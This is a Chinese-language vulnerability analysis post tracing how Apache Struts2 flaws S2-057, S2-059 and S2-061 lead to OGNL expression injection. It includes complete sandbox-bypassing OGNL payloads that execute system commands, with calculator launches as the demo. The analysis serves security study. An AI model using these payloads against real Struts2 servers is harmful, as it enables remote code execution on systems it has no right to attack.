
# 前言

本系列第四篇文章，记录 s2-057/s2-059/s2-061 的调试过程。

# S2-057

Struts2 处理重定向结果时，会从配置文件中取 namespace，如果取不到，会从当前 ActionMapping 中取，攻击者带入恶意的 namespace 在某些情况下可能导致漏洞。

> 影响版本：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-057
> 描述：namespace 处插入 OGNL 代码引发的漏洞。

漏洞作者从 S2-032/S2-033/S2-037 的漏洞中获得启发，Struts2 将不受信任的输入使用 ognl 解析导致了多个 RCE 漏洞，并且不停的修复。于是使用 QL 对常见 Struts2 RCE 的 sink/sources 点进行了定义，并配置 DataFlow 库追踪污点。这一手操作太强了，可以说我连看都没看懂，所以暂时不去分析作者的挖掘过程，只关注他爆出的漏洞点。

作者在其[博客](https://securitylab.github.com/research/apache-struts-CVE-2018-11776/)中列出了他找到的 5 个入口点，分别为 ServletActionRedirectResult/ActionChainResult/PostbackResult/ServletUrlRenderer/PortletActionRedirectResult。

这个点也可以说是 S2-012 的兄弟洞，在 S2-012 中，ServletRedirectResult 的 `execute()` 方法调用了 conditionalParse 方法二次解析了 this.location，而这个属性是用户配置的输入，造成了漏洞。而 S2-057 的基本原理也是类似，我们依次来分析一下这五个不同的入口点都对应了什么样的情况。

## ServletActionRedirectResult

ServletActionRedirectResult 与 StrutsResultSupport 同为 StrutsResultSupport 的子类，用来处理重定向时的处理结果。它的 execute 方法会调用 conditionalParse 处理 actionName/namespace/method。

![img](https://oss.javasec.org/images/1625284296441.png)

当配置 result 类型为 redirectAction 时，结果将会重定向到另一个 Action，此时将会由 ServletActionRedirectResult 来处理。例如如下配置：

```xml
<package name="default" namespace="/" extends="struts-default">
        <action name="hello" class="org.su18.struts.action.HelloWorld">
            <result type="redirectAction">
                <param name="actionName">bye</param>
                <param name="namespace">hhh</param>
                <param name="id">123</param>
                <param name="name">phoebe</param>
                <param name="gender">girl</param>
            </result>
        </action>
    </package>
```
在访问 hello.action 后，结果将会根据我们的配置进行转发，浏览器会跳转页面：

![img](https://oss.javasec.org/images/1625284296443.png)

流程就是这样的流程，但是如何触发漏洞呢？在 ServletActionRedirectResult 的 execute 中我们可以看到，程序从我们的配置中获取了 actionName、namespace、method 三个参数的值，通过 ActionMapper 的 getUriFromActionMapping 方法将配置信息处理成要跳转的路径。并使用 `setLocation` 方法设置到 StrutsResultSupport 的 location 属性中。

![img](https://oss.javasec.org/images/1625284296445.png)

然后执行父类的 execute 方法，调用 conditionalParse 方法解析 location 中的内容。接下来的流程与 S2-012 一致。

能影响最终 location 的就是我们配置的属性，其中 actionName 和 method 都是从配置文件中获取的，只有当 namespace 为空时，将会调用 `invocation.getProxy().getNamespace()` 获取当前 ActionProxy 中存放的 namespace。

在正常情况下，处理这个 namespace 属性是由 ActionMapping 的子类 DefaultActionMapper 中的 parseNameAndNamespace 方法实现：

![img](https://oss.javasec.org/images/1625284296447.png)

其中会判断 alwaysSelectFullNamespace，这个参数名为允许采用完整的命名空间，即设置命名空间是否必须进行精确匹配，true 必须，false 可以模糊匹配，默认是 false。进行精确匹配时要求请求 url 中的命名空间必须与配置文件中配置的某个命名空间必须相同，如果没有找到相同的则匹配失败。如果想要开启可以在 struts2.xml 中配置如下常量。

```xml
<constant name="struts.mapper.alwaysSelectFullNamespace" value="true" />
```

开启后，程序会在 ActionMapper 中放入精确的 namespace，否则通常情况下 namespace 会置为空。

这样这个漏洞的完整利用条件就可以理解了，在 Action 没有设置 namespace 属性，或使用了通配符，并且应用程序设置 alwaysSelectFullNamespace 为 true 时，攻击者可以通过 namespace 输入恶意 OGNL 表达式导致 RCE。


## ActionChainResult

ActionChainResult 用来处理 Action 的链式调用，虽然本质上也是 Redirect，但是跳转后的 action 可以获取上个 Action 的相关信息，并且这个跳转是由内部进行实现的，用户端是无感知的。

![img](https://oss.javasec.org/images/1625284296449.png)

通过 ActionChainResult 的 execute 代码可以看到，获取 namespace 时是与 ServletActionRedirectResult 相同的逻辑，直接使用 `TextParseUtil.translateVariables` 解析触发漏洞。

当 result 类型设置为 chain 时，重定向结果由 ActionChainResult 处理。

```xml
<action name="hello" class="org.su18.struts.action.HelloWorld">
    <result type="chain">
        <param name="actionName">bye</param>
    </result>
</action>
```

而漏洞触发条件与 ServletActionRedirectResult 一致，触发位置也一致。

## PostbackResult

PostbackResult 会将 Action 的处理结果作为请求参数进行 Action 转发。

PostbackResult 的处理逻辑与 ServletActionRedirectResult 几乎一致，以下图片用红框将关键点圈出来，不再用文字描述其中过程。

![img](https://oss.javasec.org/images/1625284296452.png)

当 result 类型设置为 chain 时，重定向结果由 PostbackResult 处理。

```xml
<action name="hello" class="org.su18.struts.action.HelloWorld">
    <result type="postback">
        <param name="actionName">bye</param>
    </result>
</action>
```
而漏洞触发条件与前两个一致，不再重复。

## PortletActionRedirectResult

PortletActionRedirectResult 类位于插件 struts2-portlet-plugin 插件包中，处理逻辑与 ServletActionRedirectResult 基本一致，如下：

![img](https://oss.javasec.org/images/1625284296455.png)

需要配置 portlet.xml ，并在 struts.xml 中配置 result 类型为 redirect-action

```xml
<package name="default" extends="struts-portlet-default">
    <action name="hello" class="org.su18.struts.action.HelloWorld">
        <result type="redirect-action">
            <param name="actionName">bye</param>
        </result>
    </action>
</package>
```

而漏洞触发条件与之前一致，不再重复。

## ServletUrlRenderer

除了上面几个重定向时对 namespace 的解析是属于同一种类的漏洞触发之外，漏洞作者还提到了 ServletUrlRenderer 这个类。

这个类在 S2-013 时我们就见过，Struts2 中使用链接标签 `<s:a>` 和 `<s:url>` 时，如果 includeParams 设置为 get/all，Struts2 会将当前请求的参数解析并带入链接标签中，造成漏洞。对于 S2-013 来说，重要的漏洞触发点就在于 ServletUrlRenderer 的 `beforeRenderUrl()` 和 `renderUrl()` 方法。

但是这个漏洞已经被修复了，把 renderUrl 方法中调用的 `UrlHelper#buildParameterSubstring` 中的解析功能删掉了，只保留了 URLEncode 编码。为什么在 S2-057 中又提到了这个点呢？

根据官方描述，当使用 URL 标签，并且同时没有设置 value 和 action ，而且上层的 package 没有设置 namespace 时可能会产生漏洞。

我们来复现一下，在 struts.xml 里设置 `struts.mapper.alwaysSelectFullNamespace` 为 true，package 中不设置 namespace，result 设置为 jsp。

```xml
<constant name="struts.mapper.alwaysSelectFullNamespace" value="true" />
<package name="default" extends="struts-default">
    <action name="hello" class="org.su18.struts.action.HelloWorld">
        <result name="success">../index.jsp</result>
    </action>
</package>
```

JSP 中我们随便写一个 url tag，里面的 value 和 action 都不配置。

```html
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="s" uri="/struts-tags" %>
<html>
<head>
    <title>S2-057</title>
</head>
<body>
<s:url>
    <s:param name="id">123</s:param>
</s:url>
</body>
</html>
```

此时启动项目访问即可触发漏洞。

![img](https://oss.javasec.org/images/1625284296458.png)

其实触发逻辑与前面 4 个一致，都是因为没有配置 namespace ，程序从当前 ActionMapping 中取，并拼接，拼接后被解析触发漏洞。

ServletUrlRenderer 的 `renderUrl()` 方法存在判断：如果 Value 和 Action 都为空时，将从ActionInvocation 的 ActionProxy 中获取 namespace，并传入 determineActionURL 方法处理。

![img](https://oss.javasec.org/images/1625284296461.png)

`UrlProvider.determineActionURL` 方法调用组件的 determineActionURL ，调用 determineNamespace 方法处理 namespace，而又调用 findString 方法。

![img](https://oss.javasec.org/images/1625284296464.png)

findString 调用 findValue 方法，最终调用了 `TextParseUtil.translateVariables` 解析 namespace。

![img](https://oss.javasec.org/images/1625284296466.png)

好了，到此为止我们已经分析完了 S2-057 所有的触发点，那该如何构造 payload 呢？

在 Struts 2.5.11 版本后，在为 OgnlUtil 注入 excludedPackageNames、excludedClasses、excludedPackageNamePatterns 时，赋值前使用了 `Collections.unmodifiableSet()` 将这几个属性赋值成为了不可修改的 SET，用来防止在 S2-045 中我们清空 OgnlUtil 属性用来绕过黑名单的操作。

![img](https://oss.javasec.org/images/1625284296469.png)

在 2.5.13 版本中，使用了 OGNL 3.1.15 版本，这个版本中，在 OgnlContext 中，无论是 get/put/remove 还是其他相关的方法，都移除了对 context 关键字的支持，也就是说，我们无法再使用 `#context` 直接获取 context 对象了。

![img](https://oss.javasec.org/images/1625284296474.png)

那么根据 S2-045 的 payload，我们需要想办法绕过上面的限制：
- 不使用 `#context` 关键字获取 context 对象。
- 不能使用 clear 方法清空 OgnlUtil 中的 excludedPackageNames、excludedClasses、excludedPackageNamePatterns 的属性，应该寻找其他方法。

而这个绕过其实非常简单：
1. 对于 `#context` 关键字的问题，我们可以使用 context 对象存在其他关键字对象中的引用来获取，通过寻找，可以使用如下方式获取：
   - 通过 request 中值栈的 context 属性：`#request['struts.valueStack'].context`
   - 通过 attr 中保存的 context 对象：`#attr['com.opensymphony.xwork2.util.ValueStack.ValueStack'].context` 或者 `#attr['struts.valueStack'].context`
2. 对于清空 OgnlUtil 中的属性，其实就更简单了，在 S2-045 我们分析过，之所以没有使用赋值的形式进行清空，就是因为它的 set 方法只是将传入的字符串 add 进去。而现在是根据传入的字符串重新生成 unmodifiableSet，再进行赋值，那我们直接调用相应的 set 方法传入一些无关紧要的包名或者类名即可。

此处有一个点需要注意的是，由于 unmodifiableSet 的原因，我们使用了 set 方法改变 excludedPackageNames、excludedClasses、excludedPackageNamePatterns 属性的值，此时不是清空，而是修改了引用对象，而此时 OgnlValueStack.securityMemberAccess 的引用对象并没有变，所以并没有修改掉 securityMemberAccess 中的内容，但是我们在之前的分析就提到过，OgnlUtil 是单例对象，改过一次之后，下次获取还是这个，因此第二次再访问创建 OgnlValueStack 时，将会使用我们修改过的属性值，从而绕过黑名单。

因此最终的 payload 为：第一个请求用来清空 OgnlUtil 中的属性

```
(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
```

第二个请求用来发送 payload

```
(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app'))
```

或者写在同一个请求中发送两次也可：

```
%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames('').(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')))}
```


# S2-059

与 S2-029/S2-036 类似的漏洞点。

> 影响版本：Struts 2.0.0 - Struts 2.5.20
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-059
> 描述：不正确的给标签属性添加 OGNL 解析，可能会造成二次解析导致 RCE。

这个漏洞通俗来讲，就是用户在配置模板或者配置文件时，对一些属性和参数使用 “${}” 和 “%{}” 包裹，进行强制计算， 就会导致 OGNL 二次解析。

早在 S2-029 和 S2-036 就有了类似的安全公告，但是我没有去做分析，因为此类漏洞的主要成因是用户的配置错误，就好像 SQL 注入漏洞的成因是用户把不受信任的输入带入了数据库查询语句一样，你只能让开发者背锅，你没办法说是框架的锅。而之前的 S2-012、S2-013、S2-014、S2-015，也可以归结到此类漏洞范围中。

其中 S2-029 官方描述受影响的标签为：

```html
<s:i18nname="%{#request.params}">su18</s:i18n>
<s:textname="%{#request.params}">su18</s:text>
```

S2-036 则描述 tag 内属性使用 `%{...}` 会导致 RCE。

而 S2-059 也是同样的漏洞。描述受影响的标签为 `<s:a id="%{id}">S2-059</s:a>`。简单搭建一个测试环境试一下：

![img](https://oss.javasec.org/images/1625284296478.png)

这个漏洞的实际触发还是在解析标签时由 ComponentTagSupport 的子类（也就是各个标签不同类型）在使用 start 方法解析时，调用了 `Component#findString` 方法导致了表达式的解析。

![img](https://oss.javasec.org/images/1625284296486.png)

漏洞触发和调用过程之前都分析过，都是相似的，在这里就不重复了。我们同时关注一下这个漏洞影响的最高版本 Struts 2.5.20 版本中的安全更新。

在 Struts 2.5.17 之后，官方更新了 excludedClasses 和 excludedPackageNames，在 excludedClasses 中移除了 ognl 包中的内容，但是在 excludedPackageNames 中加入了 `com.opensymphony.xwork2.ognl.` 。

![img](https://oss.javasec.org/images/1625284296490.png)

OnglUtil 中各个属性的 set 方法由 public 改为了 protected。包括三个黑名单属性值，此时我们将不能直接调用 set 方法。

![img](https://oss.javasec.org/images/1625284296495.png)

并且重写了这几个 set 方法中，不再单纯的生成新 set 并重新引用，而是将原始的 set 加上用户输入最终处理成 `Collections.unmodifiableSet()` 再进行赋值。此时我们将不能通过 `clear()` 或者 set 方法清空其中的值。

在 ognl 3.2.10 版本之后，删除了 DefaultMemberAccess 类，同时删除了静态变量DEFAULT_MEMBER_ACCESS，并且 _memberAccess 变成了 final。SecurityMemberAccess 不再继承DefaultMemberAccess 而直接转为 MemberAccess 接口的实现。因此我们不再能使用 DEFAULT_MEMBER_ACCESS 对象覆盖 _memberAccess。

在更高版本的 ognl 中，调用方法的 invokeMethod 方法中进行了判断，禁止调用了一些经常使用的恶意黑名单方法。

![img](https://oss.javasec.org/images/1625284296500.png)


经过上述的安全更新之后，我们在 S2-057 以及之前绕过 Struts2 的的所有想法的策略基本都被禁掉了。因此想要执行恶意 OGNL 变得越来越难。


# S2-061

S2-061 是对 S2-059 沙盒进行的绕过。

> 影响版本：Struts 2.0.0 - Struts 2.5.25
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-061
> 描述：依旧是由于标签中使用 `%{}` 导致的安全漏洞。

网络上流传了如下的 POC，说是可以用来绕过沙盒，我们来看一下：

```
%{
(#im=#application["org.apache.tomcat.InstanceManager"]).
(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).
(#bm=#im.newInstance("org.apache.commons.collections.BeanMap")).
(#bm.setBean(#stack)).
(#context=#bm.get("context")).
(#bm.setBean(#context)).
(#ma=#bm.get("memberAccess")).
(#bm.setBean(#ma)).
(#emptyset=#im.newInstance("java.util.HashSet")).
(#bm.put("excludedClasses",#emptyset)).
(#bm.put("excludedPackageNames",#emptyset)).
(#arglist=#im.newInstance("java.util.ArrayList")).
(#arglist.add("open -a Calculator.app").
(#execute=#im.newInstance("freemarker.template.utility.Execute")).
(#execute.exec(#arglist))
}
```

通过 POC 我们发现，这个利用方式是需要 Tomcat 的 InstanceManager 和 Commons-Collections 中的 BeanMap 依赖，也就是有条件的绕过，不再是像之前一样的通杀绕过沙盒。

这个版本的沙盒绕过思路，实际上是相当简单暴力，之前我们经历了若干个版本的攻与防，Struts2 官方通过黑名单、权限、类型的验证来限制我们执行恶意表达式，除了 OGNL 包里面方法调用时加的硬性限制之外，这些限制其实两个字就可以全都绕过：反射。

这就有点挖反序列化 gadget 的感觉了，POC 的具体分析[这篇文章](https://www.anquanke.com/post/id/225252)写的非常好，我这里就不再重复了，文中最后留的 POC 有下面两个：

使用 application：
```
%{
(#application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
(#application.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + 

(#application.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +
(#application.map2.setBean(#application.get('map').get('context')) == true).toString().substring(0,0) + 


(#application.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
(#application.map3.setBean(#application.get('map2').get('memberAccess')) == true).toString().substring(0,0) + 

(#application.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + 
(#application.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +

(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))
}
```
使用 request：
```
%{
(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + 

(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +
(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + 


(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + 

(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + 
(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +

(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))
}
```